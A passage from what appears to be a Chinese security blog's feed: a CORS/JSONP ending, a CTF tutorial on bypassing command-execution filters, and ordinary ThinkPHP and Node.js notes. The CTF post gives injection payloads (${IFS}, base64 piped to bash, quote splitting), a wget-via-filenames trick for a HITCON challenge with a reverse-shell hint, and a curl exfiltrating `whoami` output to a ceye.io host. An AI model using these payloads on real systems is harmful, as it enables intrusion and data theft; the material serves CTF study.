<p>并未用<code>^和$</code>进行约束，导致可以构造域名绕过，达到跨域访问，例如域名<code>http://test.club.hack.com</code>即可达到攻击目的。</p>
<h4 id="JSONP跨域"><a href="#JSONP跨域" class="headerlink" title="JSONP跨域"></a>JSONP跨域</h4><p>通过<code>script</code>的src属性实现跨域，再加上一个回调函数，返回所得的数据，这里只做大概介绍，下篇文章会详细讲解。</p>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://evoa.me/index.php/archives/43/" target="_blank" rel="noopener">https://evoa.me/index.php/archives/43/</a></p>
<p><a href="http://www.ruanyifeng.com/blog/2016/04/same-origin-policy.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2016/04/same-origin-policy.html</a></p>
<p><a href="http://www.ruanyifeng.com/blog/2016/04/cors.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2016/04/cors.html</a></p>
]]></content>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>命令执行绕过</title>
    <url>/2019/06/01/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87/</url>
    <content><![CDATA[<h3 id="命令执行过滤函数与绕过机制"><a href="#命令执行过滤函数与绕过机制" class="headerlink" title="命令执行过滤函数与绕过机制"></a>命令执行过滤函数与绕过机制</h3><p>escapeshellcmd函数：<strong>字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。(对可能进行欺骗命令执行函数的字符进行转义)，下面来具体的看一下这个函数：</strong></p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2rpuosbqzj310d0j6whe.jpg" alt=""></p>
<p>再看一下源码(阅读源码有些吃力Orz)</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2rpved7sjj30r809oq30.jpg" alt=""></p>
<p>在windows平台是通过<code>^</code>来取消特殊字符的意义的，linux下应该是直接通过<code>\\</code>来转义的,但是这里在windows下bat文件存在特别之处。</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2rpvn5jfvj31a10megn8.jpg" alt=""></p>
<p>成功用%1a绕过并进行命令执行，如果我们用<code>||,|,&amp;,&amp;&amp;</code>这些命令管道分隔符，是会被函数转义过滤掉的。这里在说一下常用的几个管道符，我比较常用的是&amp;&amp;，|。</p>
<p>在linux下：</p>
<p><code>|</code> 无论前面的命令存在与否，都只会显示后面命令的执行结果。</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2rpw5t6rdj30k302l0tc.jpg" alt=""></p>
<p><code>&amp;&amp;</code>必须要前面的命令是正确的，才可以执行后面的命令，并且会把两个命令的执行结果都显示出来。</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2rpwgcb54j30jz0b2788.jpg" alt=""></p>
<h3 id="绕过命令中对空格的过滤"><a href="#绕过命令中对空格的过滤" class="headerlink" title="绕过命令中对空格的过滤"></a>绕过命令中对空格的过滤</h3><h4 id="分隔符"><a href="#分隔符" class="headerlink" title="分隔符"></a>分隔符</h4><p><strong>${IFS}绕过</strong>：在linux下，${IFS}是分隔符的意思，所以可以有${IFS}进行空格的替代。</p>
<p><strong>${IFS}$9绕过：</strong>$起截断作用，9为当前shell进程的第九个参数，始终为空字符串，所以同样能代替空字符串进行分割。</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2rpx2hd5bj30k4024weu.jpg" alt=""></p>
<p>同样这里也可以cat${IFS}$9flag</p>
<h4 id="重定向符绕过"><a href="#重定向符绕过" class="headerlink" title="重定向符绕过"></a>重定向符绕过</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload1:cat&lt;&gt;flag</span><br><span class="line">payload2:cat&lt;flag</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2rpxbvp7qj30ee025gls.jpg" alt=""></p>
<h4 id="拼接绕过"><a href="#拼接绕过" class="headerlink" title="拼接绕过"></a>拼接绕过</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload:a&#x3D;c;b&#x3D;at;$a$b flag</span><br><span class="line"></span><br><span class="line">You GET IT</span><br></pre></td></tr></table></figure>

<h4 id="Base64编码绕过"><a href="#Base64编码绕过" class="headerlink" title="Base64编码绕过"></a>Base64编码绕过</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload1:</span><br><span class="line"></span><br><span class="line">root@aohan-virtual-machine:&#x2F;home&#x2F;aohan# &#96;echo &quot;Y2F0IGZsYWc&#x3D;&quot;|base64 -d&#96;</span><br><span class="line">You Get It</span><br><span class="line">payload2:</span><br><span class="line"></span><br><span class="line">root@aohan-virtual-machine:&#x2F;home&#x2F;aohan# echo &quot;Y2F0IGZsYWc&#x3D;&quot;|base64 -d|bash</span><br><span class="line">You Get It</span><br><span class="line">&#96;反引号在Linux下代表命令执行,这个命令代表着将字符串进行base64解码，然后输出这个命令执行后的信息</span><br></pre></td></tr></table></figure>

<h4 id="利用文件中的字母绕"><a href="#利用文件中的字母绕" class="headerlink" title="利用文件中的字母绕"></a>利用文件中的字母绕</h4><p>payload :<code>expr substr $(awk NR==1 epoch) 1 1` “`expr substr $(awk NR==2 epoch) 1 1</code></p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2rpxlv3cgj30k609ogo5.jpg" alt=""></p>
<h4 id="IP中-的绕过"><a href="#IP中-的绕过" class="headerlink" title="IP中.的绕过"></a>IP中.的绕过</h4><p>将IP转化为长整数—-转换在线工具</p>
<p><a href="http://www.msxindl.com/tools/ip/ip_num.asp" target="_blank" rel="noopener">http://www.msxindl.com/tools/ip/ip_num.asp</a></p>
<h4 id="单引号-双引号绕过"><a href="#单引号-双引号绕过" class="headerlink" title="单引号 双引号绕过"></a>单引号 双引号绕过</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@aohan-virtual-machine:&#x2F;home&#x2F;aohan# cat f&quot;&quot;lag</span><br><span class="line">You Get It</span><br><span class="line">root@aohan-virtual-machine:&#x2F;home&#x2F;aohan# cat f&#39;&#39;lag</span><br><span class="line">You Get It</span><br><span class="line">root@aohan-virtual-machine:&#x2F;home&#x2F;aohan# cat f&#39;l&#39;ag</span><br><span class="line">You Get It</span><br><span class="line">root@aohan-virtual-machine:&#x2F;home&#x2F;aohan# cat f&#39;la&#39;g</span><br><span class="line">You Get It</span><br></pre></td></tr></table></figure>

<p>都可以进行绕过</p>
<h4 id="反斜线绕过"><a href="#反斜线绕过" class="headerlink" title="反斜线绕过"></a>反斜线绕过</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@aohan-virtual-machine:&#x2F;home&#x2F;aohan# cat f\lag</span><br><span class="line">You Get It</span><br></pre></td></tr></table></figure>

<h3 id="无命令回显"><a href="#无命令回显" class="headerlink" title="无命令回显"></a>无命令回显</h3><p>例如HITCON2017的一道题：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(strlen($_GET[test])&lt;8)&#123;</span><br><span class="line"></span><br><span class="line">echo shell_exec($_GET[test]);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>就可以利用&gt;写入文件名，<code>&gt;wget\\，&gt;www.baidu.com\\ ,ls -t &gt;g, sh g</code>,执行命令，这里可以把百度换成自己vps上的文件反弹shell操作。</p>
<p><strong>第二种无回显操作方法：</strong></p>
<p>利用<code>ceye.io</code></p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2rpxv956tj314a0kfdhr.jpg" alt=""></p>
<p>因为在Linux下exec与shell_exec这种函数基本上是没有回显的，所以我们只能把内容打到ceye.io上，执行命令`curl <a href="http://f1f0nd.ceye.io/```whoami" target="_blank" rel="noopener">http://f1f0nd.ceye.io/```whoami</a> ``,然后可以看到命令的回显</p>
<h3 id="LINUX下一些已有字符"><a href="#LINUX下一些已有字符" class="headerlink" title="LINUX下一些已有字符"></a>LINUX下一些已有字符</h3><ul>
<li>${PS2} 对应字符 ‘&gt;’</li>
<li>${PS4} 对应字符 ‘+’</li>
<li>${IFS} 对应 内部字段分隔符</li>
<li>${9} 对应 空字符串</li>
</ul>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>备忘录</title>
    <url>/2019/09/23/%E5%A4%87%E5%BF%98%E5%BD%95/</url>
    <content><![CDATA[<h3 id="Mysql一些基本操作"><a href="#Mysql一些基本操作" class="headerlink" title="Mysql一些基本操作"></a>Mysql一些基本操作</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">drop table if exists  &#96;user&#96;;</span><br><span class="line"></span><br><span class="line">create table &#96;user&#96; (</span><br><span class="line">    &#96;id&#96; int(32) primary key auto_increment,</span><br><span class="line">    &#96;username&#96; varchar(40) not null,</span><br><span class="line">    &#96;password&#96; varchar(40) not null</span><br><span class="line">) ENGINE&#x3D;InnoDB DEFAULT CHARSET&#x3D;utf8 ;</span><br><span class="line"></span><br><span class="line">insert into &#96;user&#96; (&#96;id&#96;,&#96;username&#96;,&#96;password&#96;) values (&#39;1&#39;,&#39;admin&#39;,&#39;__FLAG__&#39;);</span><br><span class="line">drop table if exists &#96;html&#96;;</span><br><span class="line"></span><br><span class="line">create table &#96;html&#96; (</span><br><span class="line">    &#96;id&#96; int(32) primary key  auto_increment,</span><br><span class="line">    &#96;userid&#96; int(32) not null,</span><br><span class="line">    &#96;dom&#96; text not null</span><br><span class="line">)ENGINE&#x3D;InnoDB DEFAULT CHARSET&#x3D;utf8 ;</span><br></pre></td></tr></table></figure>

<h3 id="IDE基本调试操作"><a href="#IDE基本调试操作" class="headerlink" title="IDE基本调试操作"></a>IDE基本调试操作</h3><p>step into：单步执行，遇到子函数就进入并且继续单步执行（简而言之，进入子函数），一句一句代码执行，类似VS中的逐语句；</p>
<p>step over：在单步执行时，在函数内遇到子函数时不会进入子函数内单步执行，而是将子函数整个执行完再停止，也就是把子函数整个作为一步。有一点,经过我们简单的调试，在不存在子函数的情况下是和step into效果一样的（简而言之，越过子函数，但子函数会执行），类似VS中的逐过程。</p>
<p>step out：当单步执行到子函数内时，用step out就可以执行完子函数余下部分，并返回到上一层函数，可以理解为执行完当前模块并跳出。</p>
<h3 id="Thinkphp备忘"><a href="#Thinkphp备忘" class="headerlink" title="Thinkphp备忘"></a>Thinkphp备忘</h3><h4 id="Thinkphp安装"><a href="#Thinkphp安装" class="headerlink" title="Thinkphp安装"></a>Thinkphp安装</h4><p>利用composer安装</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">composer create-project topthink&#x2F;think&#x3D;5.1.* tp5</span><br></pre></td></tr></table></figure>

<p>通过上面的安装命令即可在tp5子目录生成项目文件</p>
<h4 id="Thinkphp目录结构"><a href="#Thinkphp目录结构" class="headerlink" title="Thinkphp目录结构"></a>Thinkphp目录结构</h4><p><a href="https://blog.csdn.net/jimo_lonely/article/details/52958751" target="_blank" rel="noopener">https://blog.csdn.net/jimo_lonely/article/details/52958751</a></p>
<p>这里用的是thinkphp5.1，目录结构如下</p>
<p><img src="https://s2.ax1x.com/2019/09/06/nuOBB4.png" alt="nuOBB4.png"></p>
<p>简单说一下各个目录的作用</p>
<ul>
<li>application: 应用目录</li>
<li>config: 配置文件</li>
<li>extend: 非composer下载的php第三方库，而是由自己定义的第三方类</li>
<li>public: 访问入口</li>
<li>route: 路由</li>
<li>runtime: 包括框架运行的日志和缓存文件（可以用来调错</li>
<li>think: 框架核心，包含很多核心类库</li>
<li>vendor: composer下载的第三方库</li>
</ul>
<h4 id="extend与vendor"><a href="#extend与vendor" class="headerlink" title="extend与vendor"></a>extend与vendor</h4><p>extend与vendor区别如下：</p>
<p>extend是自己定义的类文件，而vendor大部分都是composer类库文件，二者的引用方式分别为：</p>
<p>extend主要通过use来引用，使用例子如下：</p>
<p>在extend/test/Foo.php，写入Foo类</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">test</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Foo</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">h1llo</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'HEllo lihuaiqiu'</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在controller中进行引入调用此自定义类的h1llo函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="keyword">use</span> \<span class="title">test</span>\<span class="title">Foo</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test1</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $foo=<span class="keyword">new</span> Foo();</span><br><span class="line">    <span class="keyword">return</span> $foo-&gt;h1llo();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过路由成功访问</p>
<p><a href="http://127.0.0.1/tp5/public/index.php/index/index/test1" target="_blank" rel="noopener">http://127.0.0.1/tp5/public/index.php/index/index/test1</a></p>
<p>vender的使用方法其实和extend差不多，可通过Import或者vender两个助手函数进行加载</p>
<p>第三方类位于</p>
<p>vendor/lib/cwb.php</p>
<p>通过以下语句进行调用</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">import(<span class="string">'lib.cwb'</span>,VENDOR_PATH,<span class="string">'.class.php'</span>);</span><br></pre></td></tr></table></figure>

<p>实例化：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$obj = <span class="keyword">new</span>  \Cwb();</span><br></pre></td></tr></table></figure>

<p>详细参考连接<a href="https://blog.csdn.net/qq_42728978/article/details/82428083" target="_blank" rel="noopener">https://blog.csdn.net/qq_42728978/article/details/82428083</a></p>
<p><a href="http://www.zhangkeda.com/archives/96.html" target="_blank" rel="noopener">http://www.zhangkeda.com/archives/96.html</a></p>
<h4 id="模板与视图"><a href="#模板与视图" class="headerlink" title="模板与视图"></a>模板与视图</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="keyword">use</span> \<span class="title">test</span>\<span class="title">Foo</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> view(<span class="string">'test'</span>);</span><br><span class="line">        </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过view函数将同模块下/view/控制器名字/参数.html渲染，在无参数的情况下渲染为同模块下/view/控制器名字/方法名.html</p>
<p>admin模块渲染测试</p>
<p><img src="https://s2.ax1x.com/2019/09/06/nK4A9e.png" alt="nK4A9e.png"></p>
<h4 id="数据库操作"><a href="#数据库操作" class="headerlink" title="数据库操作"></a>数据库操作</h4><p>Thinkphp中给了两种数据库操作的的方法，第一种操作方法是利用db类，第二种方法是利用model</p>
<h5 id="db类操作数据库"><a href="#db类操作数据库" class="headerlink" title="db类操作数据库"></a>db类操作数据库</h5><p>首先在config/app.php配置一下自己数据库的基本信息，通过如下调用即可进行数据操作</p>
<p><img src="https://s2.ax1x.com/2019/09/06/nKXpk9.png" alt="nKXpk9.png"></p>
<h5 id="Model进行数据库操作"><a href="#Model进行数据库操作" class="headerlink" title="Model进行数据库操作"></a>Model进行数据库操作</h5><p>Model其实为数据表的抽象描述，主要用于操作相应的数据表(表对应的类goods.class.php、category.class.php、user.class.php)</p>
<p>首先建立model文件夹，在model中写入AdminUser类</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AdminUser</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $table=<span class="string">'tp_user'</span>;</span><br><span class="line">    <span class="keyword">protected</span> $pk = <span class="string">'id'</span>;</span><br></pre></td></tr></table></figure>

<p>在controller中调用取出数据</p>
<p><img src="https://s2.ax1x.com/2019/09/06/nMS3dO.png" alt="nMS3dO.png"></p>
<p>通过Model,controller,view三个层构造了MVC模式：</p>
<ul>
<li>用户首先通过View层输入数据</li>
<li>controller通过Model的调用来进行数据操作并且取出数据</li>
<li>controller取出的数据再交给View层，通过View来将用户想要查看的数据输出。</li>
</ul>
<p><a href="https://www.cnblogs.com/yifangtongxing/p/5512032.html" target="_blank" rel="noopener">https://www.cnblogs.com/yifangtongxing/p/5512032.html</a></p>
<h3 id="Python-Requests上传文件"><a href="#Python-Requests上传文件" class="headerlink" title="Python Requests上传文件"></a>Python Requests上传文件</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data = &#123;</span><br><span class="line">    <span class="string">'name'</span>: <span class="string">'nginx'</span></span><br><span class="line">&#125;</span><br><span class="line">files = &#123;<span class="string">'file'</span>: open(<span class="string">"abc.csv"</span>, <span class="string">'rb'</span>)&#125;</span><br><span class="line"></span><br><span class="line">response = requests.post(url, data=data, files=files)</span><br></pre></td></tr></table></figure>

<h3 id="Nodejs篇"><a href="#Nodejs篇" class="headerlink" title="Nodejs篇"></a>Nodejs篇</h3><h4 id="简单应用创建"><a href="#简单应用创建" class="headerlink" title="简单应用创建"></a>简单应用创建</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"></span><br><span class="line">http.createServer(<span class="function"><span class="keyword">function</span> (<span class="params">request, response</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 发送 HTTP 头部</span></span><br><span class="line"><span class="comment">// HTTP 状态值: 200 : OK</span></span><br><span class="line"><span class="comment">// 内容类型: text/plain</span></span><br><span class="line">response.writeHead(<span class="number">200</span>, &#123;<span class="string">'Content-Type'</span>: <span class="string">'image/png'</span>&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 发送响应数据 "Hello World"</span></span><br><span class="line">response.end(<span class="string">'Hello World\n'</span>);</span><br><span class="line"></span><br><span class="line">&#125;).listen(<span class="number">8888</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 终端打印如下信息</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'Server running at http://127.0.0.1:8888/'</span>);</span><br></pre></td></tr></table></figure>

<p>引入http模块，创建服务器，并设置返回文件类型为image/png，并且返回内容Hello World</p>
<h4 id="npm常用命令"><a href="#npm常用命令" class="headerlink" title="npm常用命令"></a>npm常用命令</h4><p>还是cnpm比较好，速度更快一些</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm ls</span><br><span class="line"></span><br><span class="line">npm unintsall</span><br><span class="line"></span><br><span class="line">npm update</span><br><span class="line"></span><br><span class="line">npm search</span><br><span class="line"></span><br><span class="line">npm init(创建package.json)</span><br></pre></td></tr></table></figure>

<h4 id="回调函数与异步编程"><a href="#回调函数与异步编程" class="headerlink" title="回调函数与异步编程"></a>回调函数与异步编程</h4><p>阻塞与非阻塞—–阻塞需要按顺序执行，而非阻塞则不需要，通过非阻塞可以不需要等待上面程序执行完毕，直接去执行下面的，也就是异步。在nodejs里的fs模块有两个函数</p>
<ul>
<li>同步：readFileSync函数</li>
<li>异步：readFile函数</li>
</ul>
<p>如下两种代码即可输出不同效果</p>
<p>异步</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">"fs"</span>);</span><br><span class="line"></span><br><span class="line">fs.readFile(<span class="string">'input.txt'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">err, data</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (err) <span class="keyword">return</span> <span class="built_in">console</span>.error(err);</span><br><span class="line">    <span class="built_in">console</span>.log(data.toString());  <span class="comment">//后显示文件读取结果</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"程序执行结束!"</span>);</span><br></pre></td></tr></table></figure>

<p>同步</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">"fs"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> data = fs.readFileSync(<span class="string">'input.txt'</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(data.toString());   <span class="comment">//先显示文件读取结果</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"程序执行结束!"</span>);</span><br></pre></td></tr></table></figure>

<p>Node.js 是单进程单线程应用程序，但是因为 V8 引擎提供的异步执行回调接口，通过这些接口可以处理大量的并发，所以性能非常高。详细解释如下</p>
<p>目前对事件循环的理解还是比较浅，作用就是通过v8的异步执行回调接口处理并发，补足了javascript是单线程的缺点</p>
<p><a href="http://lynnelv.github.io/js-event-loop-nodejs这篇文章剖析的比较详细，等有机会的时候单独写一篇文章剖析一下Node.js的事件循环。" target="_blank" rel="noopener">http://lynnelv.github.io/js-event-loop-nodejs这篇文章剖析的比较详细，等有机会的时候单独写一篇文章剖析一下Node.js的事件循环。</a></p>
<h4 id="EventEmitter"><a href="#EventEmitter" class="headerlink" title="EventEmitter"></a>EventEmitter</h4><p><a href="https://www.runoob.com/nodejs/nodejs-event.html" target="_blank" rel="noopener">https://www.runoob.com/nodejs/nodejs-event.html</a></p>
<p>主要就是创建绑定监听器，并且通过emit触发事件，去调用回调函数</p>
<p>其实看到这里，大概对事件循环的理解就是</p>
<p><strong>事件循环的监听器是一个主循环，当检测到异步事件的时候就会去触发回调函数</strong>，还是等以后结合底层源码单独去剖析一下事件循环这个有趣的东西吧</p>
<h4 id="Buffer缓冲区处理Tcp或文件流等二进制数据"><a href="#Buffer缓冲区处理Tcp或文件流等二进制数据" class="headerlink" title="Buffer缓冲区处理Tcp或文件流等二进制数据"></a>Buffer缓冲区处理Tcp或文件流等二进制数据</h4><p><a href="https://www.runoob.com/nodejs/nodejs-buffer.html" target="_blank" rel="noopener">https://www.runoob.com/nodejs/nodejs-buffer.html</a></p>
<h4 id="常见流操作"><a href="#常见流操作" class="headerlink" title="常见流操作"></a>常见流操作</h4><ul>
<li>从流中读取数据</li>
<li>写入文件</li>
<li>管道流—从一个输出流到另一个输入流</li>
<li>链式流—-解压和压缩文件</li>
</ul>
<p><a href="https://www.runoob.com/nodejs/nodejs-stream.html" target="_blank" rel="noopener">https://www.runoob.com/nodejs/nodejs-stream.html</a></p>
<h4 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h4><p><a href="https://imgchr.com/i/nUo6zQ" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/09/10/nUo6zQ.png" alt="nUo6zQ.png"></a></p>
<p>自行封装并进行引入。</p>
<h4 id="匿名函数"><a href="#匿名函数" class="headerlink" title="匿名函数"></a>匿名函数</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params">someFunction, value</span>) </span>&#123;</span><br><span class="line">  someFunction(value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">execute(<span class="function"><span class="keyword">function</span>(<span class="params">word</span>)</span>&#123; <span class="built_in">console</span>.log(word) &#125;, <span class="string">"Hello"</span>);</span><br></pre></td></tr></table></figure>

<p>将函数作为变量传递—我们不需要为这个函数起名字—-匿名函数</p>
<p>创建http服务的代码也是调用匿名函数的过程</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">"http"</span>);</span><br><span class="line"></span><br><span class="line">http.createServer(<span class="function"><span class="keyword">function</span>(<span class="params">request, response</span>) </span>&#123;</span><br><span class="line">  response.writeHead(<span class="number">200</span>, &#123;<span class="string">"Content-Type"</span>: <span class="string">"text/plain"</span>&#125;);</span><br><span class="line">  response.write(<span class="string">"Hello World"</span>);</span><br><span class="line">  response.end();</span><br><span class="line">&#125;).listen(<span class="number">8888</span>);</span><br></pre></td></tr></table></figure>

<h4 id="路由"><a href="#路由" class="headerlink" title="路由"></a>路由</h4><p><a href="https://www.runoob.com/nodejs/nodejs-router.html" target="_blank" rel="noopener">https://www.runoob.com/nodejs/nodejs-router.html</a></p>
<h4 id="Util模块"><a href="#Util模块" class="headerlink" title="Util模块"></a>Util模块</h4><p>这里简写两个函数</p>
<h5 id="util-inherits"><a href="#util-inherits" class="headerlink" title="util.inherits"></a>util.inherits</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> util = <span class="built_in">require</span>(<span class="string">'util'</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Base</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.name = <span class="string">'base'</span>;</span><br><span class="line">    <span class="keyword">this</span>.base = <span class="number">1991</span>;</span><br><span class="line">    <span class="keyword">this</span>.sayHello = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'Hello '</span> + <span class="keyword">this</span>.name);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line">Base.prototype.showName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.name);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Sub</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.name = <span class="string">'sub'</span>;</span><br><span class="line">&#125;</span><br><span class="line">util.inherits(Sub, Base);</span><br><span class="line"><span class="keyword">var</span> objBase = <span class="keyword">new</span> Base();</span><br><span class="line">objBase.showName();</span><br><span class="line">objBase.sayHello();</span><br><span class="line"><span class="built_in">console</span>.log(objBase);</span><br><span class="line"><span class="keyword">var</span> objSub = <span class="keyword">new</span> Sub();</span><br><span class="line">objSub.showName();</span><br><span class="line"><span class="comment">//objSub.sayHello();</span></span><br><span class="line"><span class="built_in">console</span>.log(objSub);</span><br></pre></td></tr></table></figure>

<p>Sub类仅仅继承了Base在原型中定义的函数showname，而base属性和sayHello函数都没有继承。</p>
<h5 id="util-inspect"><a href="#util-inspect" class="headerlink" title="util.inspect"></a>util.inspect</h5><p>这个倒是有点像序列化和反序列化</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> util = <span class="built_in">require</span>(<span class="string">'util'</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.name = <span class="string">'byvoid'</span>;</span><br><span class="line">    <span class="keyword">this</span>.toString = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.name;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> obj = <span class="keyword">new</span> Person();</span><br><span class="line"><span class="built_in">console</span>.log(util.inspect(obj));</span><br></pre></td></tr></table></figure>

<p>输出结果</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">Person &#123; <span class="attr">name</span>: <span class="string">'byvoid'</span>, <span class="attr">toString</span>: [<span class="built_in">Function</span>] &#125;</span><br></pre></td></tr></table></figure>

<h4 id="利用fs模块进行文件操作"><a href="#利用fs模块进行文件操作" class="headerlink" title="利用fs模块进行文件操作"></a>利用fs模块进行文件操作</h4><p><a href="https://www.runoob.com/nodejs/nodejs-fs.html" target="_blank" rel="noopener">https://www.runoob.com/nodejs/nodejs-fs.html</a></p>
